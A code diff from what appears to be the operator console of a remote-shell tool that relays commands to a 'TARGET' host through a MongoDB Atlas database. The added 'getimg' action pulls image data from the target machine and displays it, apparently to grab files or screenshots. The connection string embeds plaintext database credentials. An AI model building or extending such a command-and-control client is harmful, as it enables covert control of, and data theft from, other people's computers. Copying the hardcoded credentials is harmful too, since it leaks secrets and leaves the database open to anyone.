@@ -1,5 +1,7 @@
 import pymongo
 import json
+from PIL import Image as im
+import numpy as np
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
@@ -45,6 +47,20 @@ def clearCollection():
         print(e)
 
 
+def imageShow():
+    col=db['shellresult']
+    filters={
+            "hostname":TARGET
+        }
+    while True:
+        res=col.find_one(filters)
+        if res:
+            arry = np.array(res['result'])
+            data = im.fromarray(arry.astype('uint8'))
+            data.show()
+            break
+
+
 def is_directory_change_command():
     global PREV_COMMAND
     global CWD
@@ -68,6 +84,32 @@ def ActionUploader():
         for i in MY_COMMANDS:
             print(i)
         print()
+
+    elif a[0]=='getimg':
+        target_element=a[1]
+        data={
+                "action":a[0],
+                "target":TARGET,
+                "current_path":CWD,
+                "target_element":a[1],
+                "new_filename":"",
+                "target_string":"",
+                "process_taken":0
+                }
+        try:
+                if not (col.find_one()):
+                    col.insert_one(data)
+                    imageShow()
+                else:
+                    filters={
+                        "target":TARGET
+                        }
+                    col.delete_one(filters)
+                    col.insert_one(data)
+                    imageShow()
+        except Exception as e:
+                print(e)
+        
     
     else:
         if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
